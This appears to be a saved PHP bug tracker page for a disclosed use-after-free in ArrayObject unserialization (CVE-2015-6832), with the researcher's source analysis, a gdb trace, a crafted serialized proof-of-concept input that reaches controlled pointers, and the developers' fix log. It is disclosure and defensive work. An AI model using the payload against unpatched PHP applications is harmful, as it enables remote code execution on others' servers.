@@ -1,0 +1,634 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    
+        <link rel='alternate' type='application/rss+xml' title='SPL related Bug #70068 - RDF' href='rss/bug.php?id=70068'>
+        <link rel='alternate' type='application/rss+xml' title='SPL related Bug #70068 - RSS 2.0' href='rss/bug.php?id=70068&format=rss2'>
+        <base href="https://bugs.php.net/">
+    <title>PHP :: Sec Bug #70068 :: Dangling pointer in the unserialization of ArrayObject items</title>
+    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
+    <link rel="stylesheet" href="https://bugs.php.net/css/style.css">
+</head>
+
+<body>
+
+<table id="top" class="head" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="head-logo">
+            <a href="/"><img src="images/logo.png" alt="Bugs" vspace="2" hspace="2"></a>
+        </td>
+
+        <td class="head-menu">
+            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
+            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
+            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
+            <a href="report.php">report a bug</a>&nbsp;|&nbsp;
+            <a href="search.php">advanced search</a>&nbsp;|&nbsp;
+            <a href="search-howto.php">search howto</a>&nbsp;|&nbsp;
+            <a href="stats.php">statistics</a>&nbsp;|&nbsp;
+            <a href="random">random bug</a>&nbsp;|&nbsp;
+            <a href="login.php">login</a>
+        </td>
+    </tr>
+
+    <tr>
+        <td class="head-search" colspan="2">
+            <form method="get" action="search.php">
+                <p class="head-search">
+                    <input type="hidden" name="cmd" value="display">
+                    <small>go to bug id or search bugs for</small>
+                    <input class="small" type="text" name="search_for" value="" size="30">
+                    <input type="image" src="images/small_submit_white.gif" alt="search" style="vertical-align: middle;">
+                </p>
+            </form>
+        </td>
+    </tr>
+</table>
+
+<table class="middle" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="content">
+<div id="bugheader">
+    <table id="details">
+        <tr id="title">
+            <th class="details" id="number"><a href="bug.php?id=70068">Sec Bug</a>&nbsp;#70068</th>
+            <td id="summary" colspan="5">Dangling pointer in the unserialization of ArrayObject items</td>
+        </tr>
+        <tr id="submission">
+            <th class="details">Submitted:</th>
+            <td style="white-space: nowrap;">2015-07-13 22:59 UTC</td>
+            <th class="details">Modified:</th>
+            <td style="white-space: nowrap;">2015-09-09 09:57 UTC</td>
+            <td rowspan="6">
+
+
+            </td>
+        </tr>
+
+        <tr id="submitter">
+            <th class="details">From:</th>
+            <td>sean &#x64;&#111;&#x74; heelan &#x61;&#116; gmail &#x64;&#111;&#x74; com</td>
+            <th class="details">Assigned:</th>
+            <td><a href="search.php?cmd=display&amp;assign=stas">stas</a> (<a href="https://people.php.net/stas">profile</a>)</td>
+        </tr>
+
+        <tr id="categorization">
+            <th class="details">Status:</th>
+            <td>Closed</td>
+            <th class="details">Package:</th>
+            <td><a href="search.php?cmd=display&amp;package_name[]=SPL+related">SPL related</a></td>
+        </tr>
+
+        <tr id="situation">
+            <th class="details">PHP Version:</th>
+            <td>5.6.11</td>
+            <th class="details">OS:</th>
+            <td></td>
+        </tr>
+
+        <tr id="private">
+            <th class="details">Private report:</th>
+            <td>No</td>
+            <th class="details">CVE-ID:</th>
+            <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-6832" target="_blank">2015-6832</a></td>
+        </tr>
+    </table>
+</div>
+
+<div class="controls">
+<span id='control_0' class='control active'>View</span>
+<span id='control_3' class='control'><a href='bug.php?id=70068&amp;edit=3'>Add Comment</a></span>
+<span id='control_1' class='control'><a href='bug.php?id=70068&amp;edit=1'>Developer</a></span>
+<span id='control_2' class='control'><a href='bug.php?id=70068&amp;edit=2'>Edit</a></span>
+</div>
+<div class="clear"></div>
+
+
+
+<div class='comment type_comment' ><a name="1436828369">&nbsp;</a><strong>[2015-07-13 22:59 UTC] sean &#x64;&#111;&#x74; heelan &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
+<pre class='note'>Description:
+------------
+Summary
+-------
+
+During unserialization of an `ArrayObject` a dangling pointer to a `zval` is
+inadvertantly created. By correctly crafting their input to `unserialize` an
+attacker can cause this dangling pointer to be swapped into the `array` field of
+the `spl_array_object`, which is created during unserialization. The attacker
+can then cause the deallocated `zval` to be reallocated and initialized with
+data that they fully control. The outcome of this is that
+`spl_array_object-&gt;array` points to a forged `zval` structure and, as shown in
+prior research, an attacker has many paths from there towards code execution.
+The most common approach being to set the `type` field of the `zval` to equal
+`IS_ARRAY` and rewrite the `ht` field to point to a forged `HashTable`
+structure. On destruction, if the forged `HashTable` contains a pointer to a
+destructor function then this will be called.
+
+Impact
+------
+
+This vulnerability can be leveraged to achieve remote code execution. Any
+application that calls `unserialize` on user provided data is potentially
+vulnerable although exploitation will be somewhat application specific.
+
+Patch Details
+-------------
+
+The patch updates SPL_METHOD(Array, unserialize) to ensure that the `pflags`
+variable is not destroyed until after the `var_hash`, which contains a reference
+to it.
+
+Bug Details
+-----------
+
+File: ext/spl/spl_array.c
+
+1736 SPL_METHOD(Array, unserialize)
+1737 {
+
+...
+
+1744         zval *pmembers, *pflags = NULL;
+
+...
+
+1771         ALLOC_INIT_ZVAL(pflags);
+1772         if (!php_var_unserialize(&amp;pflags, &amp;p, s + buf_len, &amp;var_hash TSRMLS_CC) || Z_TYPE_P(pflags) != IS_LONG) {
+1773                 zval_ptr_dtor(&amp;pflags);
+1774                 goto outexcept;
+1775         }
+1776
+1777         --p; /* for ';' */
+1778         flags = Z_LVAL_P(pflags);
+1779         zval_ptr_dtor(&amp;pflags);
+
+During unserialization the `var_hash` variable is used to record pointers to the
+`zval` structures associated with the unserialized data. The outcome of this is
+that after `php_var_unserialize` the `var_hash` structure contains the value of
+the `pflags` variable. Under normal operation this is perfectly fine, as the
+`var_hash` structure is used to handle the unserialization of references. e.g.
+when a 'reference' field is encountered in the serialized data it indicates what
+it actually references by means of an index. This index is really an index into
+the `var_hash` structure.
+
+The problem is the call to `zval_ptr_dtor` on line 1779. After this call
+`var_hash` still contains the address of the `zval` pointed to by `pflags`, but
+the memory backing this `zval` has been returned to the heap. The questiont then
+becomes, &quot;Is it possible to access and use this dangling pointer before the
+`var_hash` structure is itself destroyed?&quot;. As it happens, this is fairly
+straightforward as the following code is soon executed:
+
+File: ext/spl/spl_array.c
+
+1790         if (*p!='m') {
+1791                 if (*p!='a' &amp;&amp; *p!='O' &amp;&amp; *p!='C' &amp;&amp; *p!='r') {
+1792                         goto outexcept;
+1793                 }
+1794                 intern-&gt;ar_flags &amp;= ~SPL_ARRAY_CLONE_MASK;
+1795                 intern-&gt;ar_flags |= flags &amp; SPL_ARRAY_CLONE_MASK;
+1796                 zval_ptr_dtor(&amp;intern-&gt;array);
+1797                 ALLOC_INIT_ZVAL(intern-&gt;array);
+1798                 if (!php_var_unserialize(&amp;intern-&gt;array, &amp;p, s + buf_len, &amp;var_hash TSRMLS_CC)) {
+1799                         goto outexcept;
+1800                 }
+1801         }
+
+In the above code `p` has type `unsigned char *` and points to the string being
+unserialized. At this stage it points towards the indicator for the type of the
+next item to be unserialized. So, if the next character in the sequence is not
+'m' and holds one of the characters compared against on line 1791
+`php_var_unserialize` will be called again and provided the `var_hash` which
+contains the dangling pointer. With some knowledge of how PHP unserializes items
+we can see that these conditions are exactly what we require. The 'r' item type
+is the indicator for a reference, and during the unserialization of a reference
+the `var_hash` structure will consulted to retrieve the appropriate `zval *`,
+which will then be swapped into the first argument to `php_var_unserialize`, a
+`zval **`.
+
+File: ext/standard/var_unserializer.re
+
+507 &quot;r:&quot; iv &quot;;&quot;             {
+508         long id;
+509
+510         *p = YYCURSOR;
+511         if (!var_hash) return 0;
+512
+513         id = parse_iv(start + 2) - 1;
+514         if (id == -1 || var_access(var_hash, id, &amp;rval_ref) != SUCCESS) {
+515                 return 0;
+516         }
+517
+518         if (*rval == *rval_ref) return 0;
+519
+520         if (*rval != NULL) {
+521                 var_push_dtor_no_addref(var_hash, rval);
+522         }
+523         *rval = *rval_ref;
+524         Z_ADDREF_PP(rval);
+525         Z_UNSET_ISREF_PP(rval);
+526
+527         return 1;
+528 }
+
+On line 514 the `var_hash` structure is consulted to find the appropriate `zval
+*`. This pointer is then swapped into the first argument to
+`php_var_unserialize` on line 523. Once this handler returns the `intern-&gt;array`
+variable in `SPL_METHOD(Array, unserialize)` contains the dangling pointer.
+
+We can demonstrate this by providing the string
+`C:11:&quot;ArrayObject&quot;:20:{x:i:0;r:2;;m:a:0:{};}` to `unserialize`.
+
+###############################################################################
+
+$ gdb -q ~/Git/php-src/sapi/cli/php
+Reading symbols from /home/sean/Git/php-src/sapi/cli/php...done.
+(gdb) b zim_spl_Array_unserialize
+Breakpoint 1 at 0x6a5149: file /home/sean/Git/php-src/ext/spl/spl_array.c, line 1737.
+(gdb) r deserialise.php /tmp/simple_poc.sz
+Starting program: /home/sean/Git/php-src/sapi/cli/php deserialise.php /tmp/simple_poc.sz
+C:11:&quot;ArrayObject&quot;:20:{x:i:0;r:2;;m:a:0:{};}
+
+Breakpoint 1, zim_spl_Array_unserialize (ht=1, return_value=0x7ffff7fc9d10, return_value_ptr=0x7fffffff9aa0,
+    this_ptr=0x7ffff7fc9b88, return_value_used=1) at /home/sean/Git/php-src/ext/spl/spl_array.c:1737
+1737	{
+(gdb) l
+1732
+1733	/* {{{ proto void ArrayObject::unserialize(string serialized)
+1734	 * unserialize the object
+1735	 */
+1736	SPL_METHOD(Array, unserialize)
+1737	{
+1738		spl_array_object *intern = (spl_array_object*)zend_object_store_get_object(getThis() TSRMLS_CC);
+1739
+1740		char *buf;
+1741		int buf_len;
+(gdb)
+1742		const unsigned char *p, *s;
+1743		php_unserialize_data_t var_hash;
+1744		zval *pmembers, *pflags = NULL;
+1745		HashTable *aht;
+1746		long flags;
+1747
+1748		if (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, &quot;s&quot;, &amp;buf, &amp;buf_len) == FAILURE) {
+1749			return;
+1750		}
+1751
+(gdb)
+1752		if (buf_len == 0) {
+1753			return;
+1754		}
+1755
+1756		aht = spl_array_get_hash_table(intern, 0 TSRMLS_CC);
+1757		if (aht-&gt;nApplyCount &gt; 0) {
+1758			zend_error(E_WARNING, &quot;Modification of ArrayObject during sorting is prohibited&quot;);
+1759			return;
+1760		}
+1761
+(gdb)
+1762		/* storage */
+1763		s = p = (const unsigned char*)buf;
+1764		PHP_VAR_UNSERIALIZE_INIT(var_hash);
+1765
+1766		if (*p!= 'x' || *++p != ':') {
+1767			goto outexcept;
+1768		}
+1769		++p;
+1770
+1771		ALLOC_INIT_ZVAL(pflags);
+(gdb)
+1772		if (!php_var_unserialize(&amp;pflags, &amp;p, s + buf_len, &amp;var_hash TSRMLS_CC) || Z_TYPE_P(pflags) != IS_LONG) {
+1773			zval_ptr_dtor(&amp;pflags);
+1774			goto outexcept;
+1775		}
+1776
+1777		--p; /* for ';' */
+1778		flags = Z_LVAL_P(pflags);
+1779		zval_ptr_dtor(&amp;pflags);
+1780		/* flags needs to be verified and we also need to verify whether the next
+1781		 * thing we get is ';'. After that we require an 'm' or somethign else
+(gdb) b 1779
+Breakpoint 2 at 0x6a535d: file /home/sean/Git/php-src/ext/spl/spl_array.c, line 1779.
+(gdb) c
+Continuing.
+
+Breakpoint 2, zim_spl_Array_unserialize (ht=1, return_value=0x7ffff7fc9d10, return_value_ptr=0x7fffffff9aa0,
+    this_ptr=0x7ffff7fc9b88, return_value_used=1) at /home/sean/Git/php-src/ext/spl/spl_array.c:1779
+1779		zval_ptr_dtor(&amp;pflags);
+(gdb) p/x pflags
+$1 = 0x7ffff7fc9d40
+(gdb) p/x ((var_entries*)var_hash-&gt;last)-&gt;data[0x1]
+$2 = 0x7ffff7fc9d40
+
+We have hit a breakpoint just before the `pflags` structure is destroyed. At
+this point we can see that a pointer to the `pflags` structure is stored within
+the `var_hash` structure.
+
+(gdb) s
+_zval_ptr_dtor (zval_ptr=0x7fffffff9750) at /home/sean/Git/php-src/Zend/zend_execute_API.c:424
+424		i_zval_ptr_dtor(*zval_ptr ZEND_FILE_LINE_RELAY_CC TSRMLS_CC);
+(gdb)
+i_zval_ptr_dtor (zval_ptr=0x7ffff7fc9d40) at /home/sean/Git/php-src/Zend/zend_execute_API.c:424
+424		i_zval_ptr_dtor(*zval_ptr ZEND_FILE_LINE_RELAY_CC TSRMLS_CC);
+(gdb)
+zval_delref_p (pz=0x7ffff7fc9d40) at /home/sean/Git/php-src/Zend/zend.h:411
+411		return --pz-&gt;refcount__gc;
+(gdb)
+i_zval_ptr_dtor (zval_ptr=0x7ffff7fc9d40) at /home/sean/Git/php-src/Zend/zend_execute.h:76
+76		if (!Z_DELREF_P(zval_ptr)) {
+(gdb)
+78			GC_REMOVE_ZVAL_FROM_BUFFER(zval_ptr);
+(gdb) n
+79			zval_dtor(zval_ptr);
+(gdb) s
+_zval_dtor (zvalue=0x7ffff7fc9d40) at /home/sean/Git/php-src/Zend/zend_variables.h:32
+32		if (zvalue-&gt;type &lt;= IS_BOOL) {
+(gdb) n
+i_zval_ptr_dtor (zval_ptr=0x7ffff7fc9d40) at /home/sean/Git/php-src/Zend/zend_execute.h:80
+80			efree_rel(zval_ptr);
+(gdb) s
+_efree (ptr=0x7ffff7fc9d40) at /home/sean/Git/php-src/Zend/zend_alloc.c:2436
+2436		if (UNEXPECTED(!AG(mm_heap)-&gt;use_zend_alloc)) {
+
+The `pflags` structure has now been destroyed and the reference to it from
+`var_hash` is dangling.
+
+(gdb) finish
+Run till exit from #0  _efree (ptr=0x7ffff7fc9d40) at /home/sean/Git/php-src/Zend/zend_alloc.c:2436
+0x00000000007f3b2b in i_zval_ptr_dtor (zval_ptr=0x7ffff7fc9d40) at /home/sean/Git/php-src/Zend/zend_execute.h:80
+80			efree_rel(zval_ptr);
+(gdb) n
+_zval_ptr_dtor (zval_ptr=0x7fffffff9750) at /home/sean/Git/php-src/Zend/zend_execute_API.c:425
+425	}
+(gdb)
+zim_spl_Array_unserialize (ht=1, return_value=0x7ffff7fc9d10, return_value_ptr=0x7fffffff9aa0, this_ptr=0x7ffff7fc9b88,
+    return_value_used=1) at /home/sean/Git/php-src/ext/spl/spl_array.c:1785
+1785		if (*p != ';') {
+(gdb) l
+1780		/* flags needs to be verified and we also need to verify whether the next
+1781		 * thing we get is ';'. After that we require an 'm' or somethign else
+1782		 * where 'm' stands for members and anything else should be an array. If
+1783		 * neither 'a' or 'm' follows we have an error. */
+1784
+1785		if (*p != ';') {
+1786			goto outexcept;
+1787		}
+1788		++p;
+1789
+(gdb)
+1790		if (*p!='m') {
+1791			if (*p!='a' &amp;&amp; *p!='O' &amp;&amp; *p!='C' &amp;&amp; *p!='r') {
+1792				goto outexcept;
+1793			}
+1794			intern-&gt;ar_flags &amp;= ~SPL_ARRAY_CLONE_MASK;
+1795			intern-&gt;ar_flags |= flags &amp; SPL_ARRAY_CLONE_MASK;
+1796			zval_ptr_dtor(&amp;intern-&gt;array);
+1797			ALLOC_INIT_ZVAL(intern-&gt;array);
+1798			if (!php_var_unserialize(&amp;intern-&gt;array, &amp;p, s + buf_len, &amp;var_hash TSRMLS_CC)) {
+1799				goto outexcept;
+(gdb)
+1800			}
+1801		}
+1802		if (*p != ';') {
+1803			goto outexcept;
+1804		}
+1805		++p;
+1806
+1807		/* members */
+1808		if (*p!= 'm' || *++p != ':') {
+1809			goto outexcept;
+(gdb) b 1798
+Breakpoint 3 at 0x6a544e: file /home/sean/Git/php-src/ext/spl/spl_array.c, line 1798.
+(gdb) c
+Continuing.
+
+Breakpoint 3, zim_spl_Array_unserialize (ht=1, return_value=0x7ffff7fc9d10, return_value_ptr=0x7fffffff9aa0,
+    this_ptr=0x7ffff7fc9b88, return_value_used=1) at /home/sean/Git/php-src/ext/spl/spl_array.c:1798
+1798			if (!php_var_unserialize(&amp;intern-&gt;array, &amp;p, s + buf_len, &amp;var_hash TSRMLS_CC)) {
+(gdb) x/s p
+0x7ffff7fcaad6:	&quot;r:2;;m:a:0:{};&quot;
+(gdb) p/x intern-&gt;array
+$3 = 0x7ffff7fc9cb0
+
+Prior to the `php_var_unserialize` call using our &quot;reference&quot; item
+`intern-&gt;array` points to the `zval` created on line 1797.
+
+(gdb) n
+1802		if (*p != ';') {
+(gdb) p/x intern-&gt;array
+$4 = 0x7ffff7fc9d40
+
+After `php_var_unserialize` returns `intern-&gt;array` points to the deallocated
+structure.
+
+###############################################################################
+
+From an attackers point of view the remaining work is to get the the deallocated
+`zval` reallocated using data which they control and then to trigger its use via
+the `intern-&gt;array` pointer. This is fairly straightforward and is explained in
+the attached Python script for generating a POC input. See crash_record.txt for
+a demonstration of what will happen when this POC is fed to `unserialize`.
+
+EOF
+
+Test script:
+---------------
+Write the following to a file and feed the file to the script below to trigger the bug:
+
+a:3:{i:0;C:11:&quot;ArrayObject&quot;:20:{x:i:0;r:3;;m:a:0:{};}i:1;d:11;i:2;S:31:&quot;AAAAAAAABBBBCCCC\01\00\00\00\04\00\00\00\00\00\00\00\00\00\00&quot;;}
+
+&lt;?php
+$handle = fopen($argv[1], &quot;r&quot;);
+if ($handle) {
+    $line = fgets($handle);
+    echo $line;
+    fclose($handle);
+    $data = unserialize($line);
+} else {
+    echo &quot;Failed to open &quot; + $argv[1];
+}
+?&gt;
+
+Actual result:
+--------------
+(gdb) r deserialise.php poc.sz
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/sean/Git/php-src/sapi/cli/php deserialise.php poc.sz
+a:3:{i:0;C:11:&quot;ArrayObject&quot;:20:{x:i:0;r:3;;m:a:0:{};}i:1;d:11;i:2;S:31:&quot;AAAAAAAABBBBCCCC\01\00\00\00\04\00\00\00\00\00\00\00\00\00\00&quot;;}
+Program received signal SIGSEGV, Segmentation fault.
+0x000000000081d906 in zend_hash_destroy (ht=0x4141414141414141) at /home/sean/Git/php-src/Zend/zend_hash.c:543
+543		p = ht-&gt;pListHead;
+(gdb) bt
+#0  0x000000000081d906 in zend_hash_destroy (ht=0x4141414141414141) at /home/sean/Git/php-src/Zend/zend_hash.c:543
+#1  0x0000000000808674 in _zval_dtor_func (zvalue=0x7ffff7fc9e18) at /home/sean/Git/php-src/Zend/zend_variables.c:45
+#2  0x00000000007f3b1f in _zval_dtor (zvalue=0x7ffff7fc9e18) at /home/sean/Git/php-src/Zend/zend_variables.h:35
+#3  i_zval_ptr_dtor (zval_ptr=0x7ffff7fc9e18) at /home/sean/Git/php-src/Zend/zend_execute.h:79
+#4  _zval_ptr_dtor (zval_ptr=0x7ffff7fc9c60) at /home/sean/Git/php-src/Zend/zend_execute_API.c:424
+#5  0x000000000069fe60 in spl_array_object_free_storage (object=0x7ffff7fc9c40) at /home/sean/Git/php-src/ext/spl/spl_array.c:152
+#6  0x000000000084aeb0 in zend_objects_store_del_ref_by_handle_ex (handle=1, handlers=0x1055280 &lt;spl_handler_ArrayObject&gt;)
+    at /home/sean/Git/php-src/Zend/zend_objects_API.c:226
+#7  0x000000000084ab3e in zend_objects_store_del_ref (zobject=0x7ffff7fc9c10) at /home/sean/Git/php-src/Zend/zend_objects_API.c:178
+#8  0x00000000008086ad in _zval_dtor_func (zvalue=0x7ffff7fc9c10) at /home/sean/Git/php-src/Zend/zend_variables.c:57
+#9  0x00000000007f3b1f in _zval_dtor (zvalue=0x7ffff7fc9c10) at /home/sean/Git/php-src/Zend/zend_variables.h:35
+#10 i_zval_ptr_dtor (zval_ptr=0x7ffff7fc9c10) at /home/sean/Git/php-src/Zend/zend_execute.h:79
+#11 _zval_ptr_dtor (zval_ptr=0x7ffff7fc9d50) at /home/sean/Git/php-src/Zend/zend_execute_API.c:424
+#12 0x000000000081d949 in zend_hash_destroy (ht=0x7ffff7fca4f8) at /home/sean/Git/php-src/Zend/zend_hash.c:548
+#13 0x0000000000808674 in _zval_dtor_func (zvalue=0x7ffff7fc9b80) at /home/sean/Git/php-src/Zend/zend_variables.c:45
+#14 0x00000000007f3b1f in _zval_dtor (zvalue=0x7ffff7fc9b80) at /home/sean/Git/php-src/Zend/zend_variables.h:35
+#15 i_zval_ptr_dtor (zval_ptr=0x7ffff7fc9b80) at /home/sean/Git/php-src/Zend/zend_execute.h:79
+#16 _zval_ptr_dtor (zval_ptr=0x7ffff7fc9f68) at /home/sean/Git/php-src/Zend/zend_execute_API.c:424
+#17 0x000000000081c0af in i_zend_hash_bucket_delete (p=0x7ffff7fc9f50, ht=0x10583e8 &lt;executor_globals+360&gt;) at /home/sean/Git/php-src/Zend/zend_hash.c:182
+#18 zend_hash_bucket_delete (ht=0x10583e8 &lt;executor_globals+360&gt;, p=0x7ffff7fc9f50) at /home/sean/Git/php-src/Zend/zend_hash.c:192
+#19 0x000000000081dbbe in zend_hash_graceful_reverse_destroy (ht=0x10583e8 &lt;executor_globals+360&gt;) at /home/sean/Git/php-src/Zend/zend_hash.c:613
+#20 0x00000000007f32cf in shutdown_executor () at /home/sean/Git/php-src/Zend/zend_execute_API.c:244
+#21 0x000000000080ab04 in zend_deactivate () at /home/sean/Git/php-src/Zend/zend.c:960
+#22 0x00000000007754fd in php_request_shutdown (dummy=0x0) at /home/sean/Git/php-src/main/main.c:1883
+#23 0x000000000093da87 in do_cli (argc=3, argv=0x105c940) at /home/sean/Git/php-src/sapi/cli/php_cli.c:1177
+#24 0x000000000093e31e in main (argc=3, argv=0x105c940) at /home/sean/Git/php-src/sapi/cli/php_cli.c:1378
+(gdb) i r
+rax            0x4141414141414141	4702111234474983745
+rbx            0x0	0
+rcx            0x310f47bd3f	210709757247
+rdx            0x4141414141414141	4702111234474983745
+rsi            0x7ffff7fc9e48	140737353915976
+rdi            0x4141414141414141	4702111234474983745
+rbp            0x7fffffffb090	0x7fffffffb090
+rsp            0x7fffffffb070	0x7fffffffb070
+r8             0x10582a0	17138336
+r9             0x8	8
+r10            0x22b	555
+r11            0x7ffff70b3e30	140737338097200
+r12            0x4207d0	4327376
+r13            0x7fffffffdbb0	140737488346032
+r14            0x0	0
+r15            0x0	0
+rip            0x81d906	0x81d906 &lt;zend_hash_destroy+16&gt;
+eflags         0x10202	[ IF RF ]
+cs             0x33	51
+ss             0x2b	43
+ds             0x0	0
+es             0x0	0
+fs             0x0	0
+gs             0x0	0
+(gdb) x/i $rip
+=&gt; 0x81d906 &lt;zend_hash_destroy+16&gt;:	mov    rax,QWORD PTR [rax+0x20]
+(gdb) l
+538
+539		IS_CONSISTENT(ht);
+540
+541		SET_INCONSISTENT(HT_IS_DESTROYING);
+542
+543		p = ht-&gt;pListHead;
+544		while (p != NULL) {
+545			q = p;
+546			p = p-&gt;pListNext;
+547			if (ht-&gt;pDestructor) {
+(gdb)
+548				ht-&gt;pDestructor(q-&gt;pData);
+549			}
+550			if (q-&gt;pData != &amp;q-&gt;pDataPtr) {
+551				pefree(q-&gt;pData, ht-&gt;persistent);
+552			}
+553			pefree(q, ht-&gt;persistent);
+554		}
+555		if (ht-&gt;nTableMask) {
+556			pefree(ht-&gt;arBuckets, ht-&gt;persistent);
+557		}
+(gdb)
+
+</pre>
+</div><h2>Patches</h2>
+<p><a href='patch-add.php?bug_id=70068'>Add a Patch</a></p><h2>Pull Requests</h2>
+<p><a href='gh-pull-add.php?bug_id=70068'>Add a Pull Request</a></p><h2 style="border-bottom:2px solid #666;margin-bottom:0;padding:5px 0;">History</h2><div id='comment_filter' class='controls comments'><span id='type_all' class='control active' onclick='do_comment(this);'>All</span><span id='type_comment' class='control ' onclick='do_comment(this);'>Comments</span><span id='type_log' class='control ' onclick='do_comment(this);'>Changes</span><span id='type_svn' class='control ' onclick='do_comment(this);'>Git/SVN commits</span><span id='type_related' class='control ' onclick='do_comment(this);'>Related reports</span>            </div>
+            <div id='comments_view' style='clear:both;'>
+<div class='comment type_comment' ><a name="1437956825">&nbsp;</a><strong>[2015-07-27 00:27 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Applied in this form: <a href="https://gist.github.com/smalyshev/c08cacf74c3bc381452c" rel="nofollow">https://gist.github.com/smalyshev/c08cacf74c3bc381452c</a>
+
+Will be in the next release version.
+</pre>
+</div><div class='comment type_svn' ><a name="1438726947">&nbsp;</a><strong>[2015-08-04 22:22 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=b7fa67742cd8d2b0ca0c0273b157f6ffee9ad6e2" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=b7fa67742cd8d2b0ca0c0273b157f6ffee9ad6e2</a>
+Log: Fix <a href='bug.php?id=70068'>bug #70068</a> (Dangling pointer in the unserialization of ArrayObject items)
+</pre>
+</div><div class='comment type_log' ><a name="1438726948">&nbsp;</a><strong>[2015-08-04 22:22 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Status: Open</span>
+<span class="added">+Status: Closed</span>
+</div></div></div><div class='comment type_svn' ><a name="1438727017">&nbsp;</a><strong>[2015-08-04 22:23 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=b7fa67742cd8d2b0ca0c0273b157f6ffee9ad6e2" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=b7fa67742cd8d2b0ca0c0273b157f6ffee9ad6e2</a>
+Log: Fix <a href='bug.php?id=70068'>bug #70068</a> (Dangling pointer in the unserialization of ArrayObject items)
+</pre>
+</div><div class='comment type_svn' ><a name="1438727411">&nbsp;</a><strong>[2015-08-04 22:30 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=b7fa67742cd8d2b0ca0c0273b157f6ffee9ad6e2" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=b7fa67742cd8d2b0ca0c0273b157f6ffee9ad6e2</a>
+Log: Fix <a href='bug.php?id=70068'>bug #70068</a> (Dangling pointer in the unserialization of ArrayObject items)
+</pre>
+</div><div class='comment type_svn' ><a name="1438759776">&nbsp;</a><strong>[2015-08-05 07:29 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=b7fa67742cd8d2b0ca0c0273b157f6ffee9ad6e2" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=b7fa67742cd8d2b0ca0c0273b157f6ffee9ad6e2</a>
+Log: Fix <a href='bug.php?id=70068'>bug #70068</a> (Dangling pointer in the unserialization of ArrayObject items)
+</pre>
+</div><div class='comment type_svn' ><a name="1438769549">&nbsp;</a><strong>[2015-08-05 10:12 UTC] <a href="//people.php.net/ab">ab@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=b7fa67742cd8d2b0ca0c0273b157f6ffee9ad6e2" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=b7fa67742cd8d2b0ca0c0273b157f6ffee9ad6e2</a>
+Log: Fix <a href='bug.php?id=70068'>bug #70068</a> (Dangling pointer in the unserialization of ArrayObject items)
+</pre>
+</div><div class='comment type_log' ><a name="1441792632">&nbsp;</a><strong>[2015-09-09 09:57 UTC] <a href="//people.php.net/kaplan">kaplan@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Assigned To:</span>
+<span class="added">+Assigned To: stas</span>
+<span class="removed">-CVE-ID:</span>
+<span class="added">+CVE-ID:      2015-6832</span>
+</div></div></div></div>
+        </td>
+    </tr>
+</table>
+
+<script src='js/util.js'></script>
+<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
+<script src="js/jquery.cookie.js"></script>
+<script>
+function do_comment(nd)
+{
+    $('#comment_filter > .control.active').removeClass("active");
+    $(nd).addClass("active");
+
+    $.cookie('history_tab', nd.id, { expires: 365 });
+
+    if (nd.id == 'type_all') {
+        $('#comments_view > .comment:hidden').show('slow');
+    } else {
+        $('#comments_view > .comment').each(function(i) {
+            if ($(this).hasClass(nd.id)) {
+                $(this).show('slow');
+            } else {
+                $(this).hide('slow');
+            }
+        });
+    }
+    return false;
+}
+</script>
+<table class="foot" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="foot-bar" colspan="2">&nbsp;</td>
+    </tr>
+
+    <tr>
+        <td class="foot-copy">
+            <small>
+                <a href="https://php.net/"><img src="images/logo-small.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
+                <a href="https://php.net/copyright.php">Copyright &copy; 2001-2021 The PHP Group</a><br>
+                All rights reserved.
+            </small>
+        </td>
+        <td class="foot-source">
+            <small>Last updated: Sat Oct 30 19:03:34 2021 UTC</small>
+        </td>
+    </tr>
+</table>
+</body>
+</html>
